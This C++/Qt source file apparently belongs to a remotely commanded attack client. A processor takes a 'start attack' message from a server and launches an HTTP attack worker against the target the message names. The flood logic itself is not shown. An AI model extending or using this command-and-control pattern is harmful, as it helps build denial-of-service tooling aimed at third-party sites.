#include <QUrl>

#include "../Controllers/attackcontroller.h"
#include "../Workers/httpattackworker.h"
#include "startattackprocessor.h"

using namespace controllers;
using namespace network;
using namespace network::messages::server;
using namespace workers;

namespace processors
{
    void StartAttackProcessor::process(std::shared_ptr<ServerMessage> message, ServerAdapter&)
    {
        auto startAttackMessage = std::dynamic_pointer_cast<StartAttackMessage> (message);


        if(startAttackMessage)
        {
            AttackController::get().start(
                        startAttackMessage->target(),
                        findAttackMethod(startAttackMessage->methodOfAttack()));
        }
    }

    std::function<AttackWorkerBase*(QUrl)> StartAttackProcessor::findAttackMethod(QString)
    {
        // Statically return the only method of attack available, to extend when the client can
        // provide more than one attack.
        return [](QUrl url) { return new HttpAttackWorker(url); };
    }
}
